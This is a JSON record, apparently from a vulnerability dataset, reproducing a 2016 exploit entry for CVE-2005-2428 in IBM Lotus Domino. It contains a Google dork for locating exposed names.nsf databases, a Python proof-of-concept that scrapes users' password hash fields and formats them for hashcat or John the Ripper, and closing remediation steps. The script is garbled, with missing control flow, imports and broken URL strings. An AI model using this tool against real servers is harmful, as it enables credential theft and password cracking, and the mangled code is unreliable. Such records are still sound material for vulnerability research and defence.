{
    "text": "vul_name : IBM Lotus Domino <= R8 Password Hash Extraction Exploit ， vul_cve : CVE-2005-2428 ， vul_poc :  # Exploit Title : IBM Lotus Domino <= R8 Password Hash Extraction Exploit ，  # Google Dork : inurl : names.nsf?opendatabase ，  # Date : 02-24-2016 ，  # Exploit Author : Jonathan Broche ，  # Contact :  ，  # Vendor Homepage :  ，  # Tested on : Lotus Domino 8.5 ，  # CVE : CVE-2005-2428 ， 1. Description ， IBM Domino Databases contain a configuration issue allowing users to obtain password hashes , configuraiton information and more from the Public Address Book ( i.e. , names.nsf database ) . Password hashes are obtained from the hidden HTML HTTPPassword and dspHTTPPassword fields per user in the database. ， 2. Proof of Concept ，  #  ! /usr/bin/env python2 ， requests.packages.urllib3.disable_warnings (  )  ， parser = argparse.ArgumentParser ( description='Domino Effect - A Lotus Domino password hash tool by Jonathan Broche (  @ g0jhonny ) ' , version=\"1.0\" )  ， parser.add_argument ( 'system' , help=\"IP address or hostname to harvest hashes from. \" )  ， parser.add_argument ( '-u' , '-uri' , metavar='path' , default=\"/names.nsf\" , help=\"Path to the names.nsf file. [ Default : /names.nsf ] \" )  ， outgroup = parser.add_argument_group ( title=\"Output Options\" )  ， outgroup.add_argument ( '-hashcat' , action='store_true' , help=\"Print results for use with hashcat.\" )  ， outgroup.add_argument ( '-john' , action='store_true' , help=\"Print results for use with John the Ripper.\" )  ， parser.print_help (  )  ， sys.exit ( 1 )  ， args = parser.parse_args (  )  ， print \"\\nDomino Effect {}\\n\".format ( parser.version )  ， headers={'User-Agent' : 'Mozilla/5.0 ( X11 ; U ; Linux i686 ; en-US ) AppleWebKit/534.3 ( KHTML , like Gecko ) Chrome/6.0.472.63 Safari/534.3'} ， response = requests.get ( \" args.uri )  , verify=False , headers=headers , timeout=3 )  ， print \" [  !  ] Timed out , try again.\" ， sys.exit ( 1 )  ， print e ， soup = BeautifulSoup.BeautifulSoup ( response.text )  ， links = [  ]  ，  # grab all user profile links ， links.append ( link [ 'href' ]  )  ， hashes = {} ， response = requests.get ( \" link )  , verify=False , headers=headers , timeout=2 )  ， pass ， print e ， soup = BeautifulSoup.BeautifulSoup ( response.text )  ， name = soup.find ( 'input' , {'name' : ' $ dspShortName'} ) .get ( 'value' ) .strip (  )  # short name ， httppassword = soup.find ( 'input' , { \"name\" : \"HTTPPassword\"} ) .get ( 'value' ) .strip (  )  ， dsphttppassword = soup.find ( 'input' , { \"name\" : \"dspHTTPPassword\"} ) .get ( 'value' ) .strip (  )  ， hashes [ httppassword ] = name ， elif dsphttppassword and dsphttppassword not in hashes.keys (  )  :  ， hashes [ dsphttppassword ] = name ， print h ， print \"{} : {}\".format ( n , h )  ， print \" [  *  ] User : {} Hash : {}\".format ( n , h )  ， print \"\\n{} hashes obtained\\n\".format ( len ( hashes )  ， 3. Solution ， To hide the HTTP password from the HTML source :  ， 1 ) Open the $ PersonalInheritableSchema subform ( In the designer under Shared Code , Subforms ) . ， 2 ) Find the fields :  $ dspHTTPPassword and HTTPPassword. ， 3 ) In the field properties for both fields , on the hide tab under \"Hide paragram from\" check off \"Web browsers\". ， 4 ) Open the Person form ( Under Forms ) . ， 5 ) In the form properties , on the 2nd tab , disable the option \"Generate HTML for all fields\". ， In addition , ensure proper firewalls are in place within your environment to prevent public exposure of the names.nsf database and other senstive files.",
    "time": "2016.02.26"
}